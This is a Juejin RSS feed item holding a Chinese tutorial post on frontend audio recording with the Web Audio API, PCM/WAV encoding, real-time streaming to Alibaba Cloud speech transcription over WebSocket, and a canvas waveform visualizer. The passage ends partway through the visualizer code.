<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[web audio api前端录音与实时语音转写技术实现]]></title>    <link>https://juejin.cn/post/7603054272159170610</link>    <guid>https://juejin.cn/post/7603054272159170610</guid>    <pubDate>2026-02-05T11:24:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272159170610" data-draft-id="7602634187283955722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="web audio api前端录音与实时语音转写技术实现"/> <meta itemprop="keywords" content="前端,JavaScript,开源"/> <meta itemprop="datePublished" content="2026-02-05T11:24:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xlybyte"/> <meta itemprop="url" content="https://juejin.cn/user/1082388769678615"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            web audio api前端录音与实时语音转写技术实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1082388769678615/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xlybyte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T11:24:25.000Z" title="Thu Feb 05 2026 11:24:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前端录音与实时语音转写技术实现</h2>
<h3 data-id="heading-1">一、项目概述</h3>
<p>这是一个基于浏览器原生能力的前端录音工具，集成了<strong>阿里云通译听悟</strong>的实时语音转写（ASR）能力。项目核心功能包括：</p>
<ul>
<li><strong>音频录制</strong>：使用 Web Audio API 实现高质量录音</li>
<li><strong>实时转写</strong>：通过 WebSocket 将音频流实时发送到阿里云 ASR 服务</li>
<li><strong>波形可视化</strong>：提供频率柱状图</li>
<li><strong>录音控制</strong>：支持开始、暂停、继续、停止等操作</li>
</ul>
<h3 data-id="heading-2">二、技术架构</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│                      Vue 组件层 (index.vue)                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │  录音控制   │  │  ASR展示    │  │   WebSocket 通信    │  │
│  └──────┬──────┘  └──────┬──────┘  └──────────┬──────────┘  │
└─────────┼────────────────┼───────────────────┼─────────────┘
          │                │                   │
          ▼                ▼                   ▼
┌─────────────────┐  ┌───────────────┐  ┌─────────────────────┐
│   Recorder类    │  │ WaveformVisual│  │   阿里云 ASR API    │
│  (recorder.js)  │  │  (wave.js)    │  │   (听悟服务)        │
└────────┬────────┘  └───────────────┘  └─────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────┐
│              Web <span class="hljs-selector-tag">Audio</span> API + getUserMedia                    │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-3">三、核心实现原理</h3>
<h4 data-id="heading-4">3.1 音频采集原理</h4>
<p>浏览器录音主要依赖两个核心 API：</p>




















<table><thead><tr><th>API</th><th>作用</th><th>浏览器支持</th></tr></thead><tbody><tr><td><code>getUserMedia</code></td><td>获取麦克风音频流</td><td>所有现代浏览器</td></tr><tr><td><code>AudioContext</code></td><td>音频处理上下文</td><td>Chrome 35+, Firefox 25+</td></tr></tbody></table>
<p><strong>音频处理流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">麦克风 → MediaStream → AudioContext → ScriptProcessorNode → PCM数据
<span class="hljs-code">                              ↓
                        AnalyserNode → 波形数据
</span></code></pre>
<h4 data-id="heading-5">3.2 Recorder 类核心设计</h4>
<p><code>Recorder</code> 类是整个录音功能的核心，采用了<strong>面向对象</strong>的设计模式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Recorder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">options = {}</span>) {
    <span class="hljs-comment">// 配置参数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">sampleBits</span>: <span class="hljs-number">16</span>,        <span class="hljs-comment">// 采样位数</span>
      <span class="hljs-attr">sampleRate</span>: <span class="hljs-number">16000</span>,     <span class="hljs-comment">// 采样率（阿里云ASR推荐）</span>
      <span class="hljs-attr">numChannels</span>: <span class="hljs-number">1</span>,        <span class="hljs-comment">// 声道数</span>
      <span class="hljs-attr">compiling</span>: <span class="hljs-literal">true</span>,       <span class="hljs-comment">// 边录边转模式</span>
    };
  }
}
</code></pre>
<p><strong>关键技术点</strong>：</p>
<h5 data-id="heading-6">1) 音频节点创建</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建音频分析节点</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">analyser</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-title function_">createAnalyser</span>();
<span class="hljs-variable language_">this</span>.<span class="hljs-property">analyser</span>.<span class="hljs-property">fftSize</span> = <span class="hljs-number">2048</span>;

<span class="hljs-comment">// 创建脚本处理节点（每采集4096个样本触发一次）</span>
<span class="hljs-variable language_">this</span>.<span class="hljs-property">recorder</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">context</span>.<span class="hljs-title function_">createScriptProcessor</span>(<span class="hljs-number">4096</span>, numChannels, numChannels);
</code></pre>
<p><strong>为什么选择 4096？</strong></p>
<ul>
<li>平衡延迟和性能</li>
<li>4096 样本 ≈ 95ms（44.1kHz采样率下）</li>
<li>适合实时处理场景</li>
</ul>
<h5 data-id="heading-7">2) 音频数据采集</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">this</span>.<span class="hljs-property">recorder</span>.<span class="hljs-property">onaudioprocess</span> = <span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
  <span class="hljs-comment">// 获取左声道PCM数据（Float32Array，范围[-1, 1]）</span>
  <span class="hljs-keyword">let</span> lData = e.<span class="hljs-property">inputBuffer</span>.<span class="hljs-title function_">getChannelData</span>(<span class="hljs-number">0</span>);
  
  <span class="hljs-comment">// 存储原始数据</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">lBuffer</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(lData));
  
  <span class="hljs-comment">// 边录边转：立即转换为PCM格式</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">compiling</span>) {
    <span class="hljs-keyword">let</span> pcm = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">transformIntoPCM</span>(lData, rData);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tempPCM</span>.<span class="hljs-title function_">push</span>(pcm);
  }
};
</code></pre>
<h5 data-id="heading-8">3) PCM 编码原理</h5>
<p>PCM（Pulse Code Modulation）是音频的原始数字表示形式：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">encodePCM</span>(<span class="hljs-params">bytes, sampleBits, littleEdian = <span class="hljs-literal">true</span></span>) {
  <span class="hljs-comment">// Float32Array [-1, 1] → Int16 [-32768, 32767]</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; bytes.<span class="hljs-property">length</span>; i++, offset += <span class="hljs-number">2</span>) {
    <span class="hljs-keyword">let</span> s = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(-<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">1</span>, bytes[i]));
    <span class="hljs-comment">// 负数 * 32768，正数 * 32767</span>
    data.<span class="hljs-title function_">setInt16</span>(offset, s &lt; <span class="hljs-number">0</span> ? s * <span class="hljs-number">0x8000</span> : s * <span class="hljs-number">0x7FFF</span>, littleEdian);
  }
}
</code></pre>




















<table><thead><tr><th>采样位数</th><th>范围</th><th>计算公式</th></tr></thead><tbody><tr><td>8-bit</td><td>[0, 255]</td><td><code>val = s * 128 + 128</code></td></tr><tr><td>16-bit</td><td>[-32768, 32767]</td><td><code>val = s * 32768</code> (负数) / <code>s * 32767</code> (正数)</td></tr></tbody></table>
<h5 data-id="heading-9">4) WAV 文件格式</h5>
<p>WAV = WAV Header (44字节) + PCM 数据</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">encodeWAV</span>(<span class="hljs-params">bytes, sampleRate, numChannels, sampleBits</span>) {
  <span class="hljs-keyword">let</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">44</span> + bytes.<span class="hljs-property">byteLength</span>);
  <span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(buffer);
  
  <span class="hljs-comment">// RIFF 标识</span>
  <span class="hljs-title function_">writeString</span>(view, <span class="hljs-number">0</span>, <span class="hljs-string">'RIFF'</span>);
  view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>, <span class="hljs-number">36</span> + bytes.<span class="hljs-property">byteLength</span>, <span class="hljs-literal">true</span>);
  <span class="hljs-title function_">writeString</span>(view, <span class="hljs-number">8</span>, <span class="hljs-string">'WAVE'</span>);
  
  <span class="hljs-comment">// fmt 子块</span>
  <span class="hljs-title function_">writeString</span>(view, <span class="hljs-number">12</span>, <span class="hljs-string">'fmt '</span>);
  view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>, <span class="hljs-literal">true</span>);        <span class="hljs-comment">// 子块大小</span>
  view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">20</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);         <span class="hljs-comment">// 音频格式（PCM=1）</span>
  view.<span class="hljs-title function_">setUint16</span>(<span class="hljs-number">22</span>, numChannels, <span class="hljs-literal">true</span>);
  view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">24</span>, sampleRate, <span class="hljs-literal">true</span>);
  <span class="hljs-comment">// ... 更多头部信息</span>
  
  <span class="hljs-comment">// data 子块</span>
  <span class="hljs-title function_">writeString</span>(view, <span class="hljs-number">36</span>, <span class="hljs-string">'data'</span>);
  view.<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">40</span>, bytes.<span class="hljs-property">byteLength</span>, <span class="hljs-literal">true</span>);
  
  <span class="hljs-comment">// 追加 PCM 数据</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer);
}
</code></pre>
<h4 data-id="heading-10">3.3 边录边转实现</h4>
<p><strong>核心流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">录音开始 → onaudioprocess 触发 → 转换PCM → WebSocket发送 → 阿里云ASR
<span class="hljs-code">              ↓                                            ↓
         每4096样本触发                              返回识别结果
</span></code></pre>
<p><strong>关键代码</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// index.vue 中的处理</span>
<span class="hljs-title function_">processFn</span>(<span class="hljs-params">params</span>) {
  <span class="hljs-keyword">const</span> newBuff = params.<span class="hljs-property">data</span>[params.<span class="hljs-property">data</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];  <span class="hljs-comment">// 获取最新PCM块</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>?.<span class="hljs-property">readyState</span> == <span class="hljs-number">1</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-title function_">send</span>(newBuff);  <span class="hljs-comment">// 实时发送</span>
  }
}
</code></pre>
<h4 data-id="heading-11">3.4 阿里云实时 ASR 集成</h4>
<p><strong>WebSocket 通信协议</strong>：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 建立连接</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsSrc</span>);  <span class="hljs-comment">// wsSrc 从通义拿到的websocket连接地址</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">binaryType</span> = <span class="hljs-string">"arraybuffer"</span>; <span class="hljs-comment">//传输的是 ArrayBuffer 类型的数据</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">async</span> () =&gt; {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">readyState</span> == <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">const</span> params = {
              <span class="hljs-attr">header</span>: {
                <span class="hljs-attr">name</span>: <span class="hljs-string">"StartTranscription"</span>,
                <span class="hljs-attr">namespace</span>: <span class="hljs-string">"SpeechTranscriber"</span>,
              },
              <span class="hljs-attr">payload</span>: { <span class="hljs-attr">format</span>: <span class="hljs-string">"pcm"</span> },
            };
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params));
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"WebSocket连接已成功打开"</span>);
            <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>);
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ([<span class="hljs-number">2</span>, <span class="hljs-number">3</span>].<span class="hljs-title function_">includes</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">readyState</span>)) {
            <span class="hljs-title function_">reject</span>(<span class="hljs-literal">false</span>);
          }
        };
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"WebSocket错误:"</span>, err);
          <span class="hljs-title function_">reject</span>(<span class="hljs-literal">false</span>);
        };
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">onclose</span> = <span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"WebSocket连接已关闭"</span>);
          <span class="hljs-comment">// reject(false);</span>
          <span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">()=&gt;</span> {  <span class="hljs-comment">// 简单实现自动重连</span>
              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"WebSocket 尝试重新连接"</span>);
              <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">openWs</span>();
          }, <span class="hljs-number">3</span> * <span class="hljs-number">1000</span>);
        };
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">wsObj</span>.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleMessage</span>(msg);
        };
      });
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 连接建立后发送开始指令</span>
<span class="hljs-keyword">const</span> params = {
  <span class="hljs-attr">header</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"StartTranscription"</span>,
    <span class="hljs-attr">namespace</span>: <span class="hljs-string">"SpeechTranscriber"</span>,
  },
  <span class="hljs-attr">payload</span>: { <span class="hljs-attr">format</span>: <span class="hljs-string">"pcm"</span> },
};
wsObj.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(params));

<span class="hljs-comment">// 2. 持续发送音频数据</span>
wsObj.<span class="hljs-title function_">send</span>(pcmData);  <span class="hljs-comment">// ArrayBuffer 格式</span>

<span class="hljs-comment">// 3. 接收识别结果</span>
wsObj.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> dataJson = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(msg.<span class="hljs-property">data</span>);
  <span class="hljs-keyword">switch</span> (dataJson.<span class="hljs-property">header</span>.<span class="hljs-property">name</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">"SentenceBegin"</span>:           <span class="hljs-comment">// 句子开始</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">"TranscriptionResultChanged"</span>: <span class="hljs-comment">// 实时结果变化</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">"SentenceEnd"</span>:             <span class="hljs-comment">// 句子结束</span>
    <span class="hljs-keyword">case</span> <span class="hljs-string">"ResultTranslated"</span>:        <span class="hljs-comment">// 翻译结果</span>
  }
};
</code></pre>
<p><strong>事件类型说明</strong>：</p>
<p>来源于通义文档，最新请参考通义文档(在文档底部有提供地址)</p>






























<table><thead><tr><th>事件</th><th>说明</th><th>用途</th></tr></thead><tbody><tr><td><code>SentenceBegin</code></td><td>新句子开始</td><td>初始化新句子对象</td></tr><tr><td><code>TranscriptionResultChanged</code></td><td>识别中结果变化</td><td>实时更新显示</td></tr><tr><td><code>SentenceEnd</code></td><td>句子结束</td><td>合并最终结果</td></tr><tr><td><code>ResultTranslated</code></td><td>翻译完成</td><td>显示翻译内容</td></tr></tbody></table>
<h4 data-id="heading-12">3.5 波形可视化实现</h4>
<p>项目提供两种可视化方式：</p>
<p><strong>1) 频率柱状图 (wave.js)</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c74a870cd0f4531a8024a82fcc2f4db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGx5Ynl0ZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770895465&amp;x-signature=qHsNjABXZ29eq%2B0KgXQHgNeiFYk%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WaveformVisualizer</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">canvas, options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = canvas;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);

    <span class="hljs-comment">// 默认配置</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = {
      <span class="hljs-attr">barWidth</span>: options.<span class="hljs-property">barWidth</span> || <span class="hljs-number">5</span>,
      <span class="hljs-attr">barSpacing</span>: options.<span class="hljs-property">barSpacing</span> || <span class="hljs-number">2</span>,
      <span class="hljs-attr">minHeight</span>: options.<span class="hljs-property">minHeight</span> || <span class="hljs-number">5</span>, <span class="hljs-comment">// 最小高度百分比</span>
      <span class="hljs-attr">amplification</span>: options.<span class="hljs-property">amplification</span> || <span class="hljs-number">3</span>, <span class="hljs-comment">// 放大倍数</span>
      <span class="hljs-attr">smoothing</span>: options.<span class="hljs-property">smoothing</span> || <span class="hljs-number">0.7</span>, <span class="hljs-comment">// 平滑度 (0-1)</span>
      <span class="hljs-attr">barColor</span>: options.<span class="hljs-property">barColor</span> || <span class="hljs-string">'#4d79ff'</span>,
      <span class="hljs-attr">gradientColor</span>: options.<span class="hljs-property">gradientColor</span> || <span class="hljs-string">'#ff4d4d'</span>
    };

    <span class="hljs-comment">// 状态变量</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isDrawing</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">animationId</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentData</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">smoothedData</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(<span class="hljs-number">1024</span>);

    <span class="hljs-comment">// 初始化Canvas尺寸</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resizeCanvas</span>();
    <span class="hljs-comment">// window.addEventListener('resize', () =&gt; this.resizeCanvas());</span>
  }

  <span class="hljs-comment">// 调整Canvas尺寸</span>
  <span class="hljs-title function_">resizeCanvas</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">offsetWidth</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">offsetHeight</span>;
  }

  <span class="hljs-comment">// 更新配置</span>
  <span class="hljs-title function_">updateConfig</span>(<span class="hljs-params">newConfig</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span> = { ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>, ...newConfig };
  }

  <span class="hljs-comment">// 设置数据</span>
  <span class="hljs-title function_">setData</span>(<span class="hljs-params">dataArray</span>) {
    <span class="hljs-keyword">if</span> (dataArray &amp;&amp; dataArray.<span class="hljs-property">length</span> === <span class="hljs-number">1024</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentData</span> = dataArray;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentData</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);
    }
  }

  <span class="hljs-comment">// 处理数据 - 增强波动效果</span>
  <span class="hljs-title function_">processData</span>(<span class="hljs-params">dataArray</span>) {
    <span class="hljs-keyword">const</span> { amplification, smoothing } = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>;
    <span class="hljs-keyword">const</span> processedData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">1024</span>);

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; dataArray.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-comment">// 应用放大倍数</span>
      <span class="hljs-keyword">let</span> value = dataArray[i] * amplification;

      <span class="hljs-comment">// 应用平滑处理</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">smoothedData</span>[i] = smoothing * <span class="hljs-variable language_">this</span>.<span class="hljs-property">smoothedData</span>[i] + (<span class="hljs-number">1</span> - smoothing) * value;

      <span class="hljs-comment">// 确保值在0-255范围内</span>
      processedData[i] = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-number">255</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">smoothedData</span>[i]));
    }

    <span class="hljs-keyword">return</span> processedData;
  }

  <span class="hljs-comment">// 绘制波形</span>
  <span class="hljs-title function_">draw</span>(<span class="hljs-params">dataArray = <span class="hljs-variable language_">this</span>.currentData</span>) {
